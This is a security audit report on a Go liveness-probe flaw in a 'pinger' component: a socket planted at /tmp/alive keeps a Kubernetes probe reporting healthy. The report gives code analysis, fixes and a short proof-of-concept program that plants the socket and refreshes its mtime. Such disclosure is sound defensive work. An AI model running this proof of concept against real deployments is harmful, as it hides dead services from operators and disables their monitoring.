Audit Report

## Title
Liveness Probe Bypass via Socket File at `/tmp/alive` Due to Missing File-Type Validation and Silent Heartbeat Write Failure

## Summary
The Kubernetes liveness probe for the `pinger` component can be permanently spoofed by planting a Unix domain socket at `/tmp/alive`. The healthcheck binary accepts any inode type at that path, and the heartbeat writer silently discards write errors, so the pinger's actual liveness is never reflected once the socket is in place.

## Finding Description

**Code path 1 — healthcheck (`pinger/cmd/healthcheck/main.go:27–39`):**

```go
fi, err := os.Stat("/tmp/alive")   // succeeds on any inode type
if err != nil { ... os.Exit(1) }
age := time.Since(fi.ModTime())    // reads st_mtime of whatever inode exists
if age > 2*time.Minute { ... os.Exit(1) }
os.Exit(0)                         // healthy if mtime is fresh
``` [1](#0-0) 

`os.Stat` wraps `stat(2)`, which succeeds for regular files, sockets, pipes, and directories alike. There is no `fi.Mode().IsRegular()` or equivalent check. The sole validation is the 2-minute mtime window.

**Code path 2 — heartbeat writer (`pinger/main.go:36`):**

```go
_ = os.WriteFile("/tmp/alive", []byte(time.Now().Format(time.RFC3339Nano)), 0644)
``` [4](#0-3) 

`os.WriteFile` internally calls `open(path, O_WRONLY|O_CREATE|O_TRUNC)`. On Linux, calling `open(2)` on a Unix domain socket inode returns `ENXIO`. The error is silently discarded; the socket's mtime is never updated by the pinger.

**Root cause:** Two independent failed assumptions operating together:
1. The healthcheck assumes only a regular file can exist at `/tmp/alive`.
2. The heartbeat goroutine assumes `os.WriteFile` always succeeds or that failure is harmless.

## Impact Explanation
The pinger's purpose is to submit periodic Hedera network transactions as a liveness signal for the mirror node infrastructure. If the pinger process dies but the liveness probe is permanently spoofed, Kubernetes never restarts the pod. The result is silent, indefinite cessation of transaction submission with no alerting from the orchestration layer. The monitoring and pinging function of the component is completely neutralized for as long as the attacker maintains the socket file.

## Likelihood Explanation
**Precondition:** Write access to `/tmp` inside the pod. Realistic vectors include:
- A sidecar container (log shipper, service mesh proxy, init container) sharing an `emptyDir` volume mounted at `/tmp` — a common Kubernetes pattern.
- Any code-execution vulnerability in the pinger binary itself running as UID 1000, which already owns `/tmp`.
- A compromised supply-chain artifact injected into the same pod.

The attack requires no elevated privileges, no kernel exploits, and no capabilities. Socket creation is a single syscall. Maintaining the attack (refreshing mtime every <2 minutes) is trivially automated. Existing mitigations (`readOnlyRootFilesystem`, `runAsNonRoot`, `capabilities: drop: [ALL]`) do not protect the writable `tmpfs` at `/tmp` and do not prevent socket creation.

## Recommendation
1. **Add file-type validation in the healthcheck** — after `os.Stat`, assert the inode is a regular file:
   ```go
   if !fi.Mode().IsRegular() {
       fmt.Fprintln(os.Stderr, "alive: not a regular file")
       os.Exit(1)
   }
   ```
2. **Log or fatal on heartbeat write failure** — replace the silent discard:
   ```go
   if err := os.WriteFile("/tmp/alive", ...); err != nil {
       log.Printf("heartbeat write failed: %v", err)
   }
   ```
3. **Restrict `/tmp` permissions** — use an init container to `chmod 700 /tmp` or mount a dedicated `emptyDir` for the heartbeat file rather than sharing the general `/tmp` with other containers.
4. **Use `O_EXCL` + atomic rename** — write to a temp file and `os.Rename` into place; `rename(2)` on a socket target will replace it atomically with a regular file, eliminating the persistent socket scenario.

## Proof of Concept
```go
// Attacker code running inside the pod (no capabilities required)
package main

import (
    "net"
    "syscall"
    "time"
)

func main() {
    // Remove any existing file and plant a socket at /tmp/alive
    syscall.Unlink("/tmp/alive")
    l, _ := net.Listen("unix", "/tmp/alive")
    defer l.Close()

    // Refresh mtime every 90 seconds to stay within the 2-minute window
    for {
        now := time.Now()
        syscall.Utimes("/tmp/alive", []syscall.Timeval{
            {Sec: now.Unix()}, {Sec: now.Unix()},
        })
        time.Sleep(90 * time.Second)
    }
    // Kubernetes liveness probe now permanently returns healthy.
    // Pinger's os.WriteFile returns ENXIO silently; socket mtime is
    // controlled entirely by the attacker.
}
```
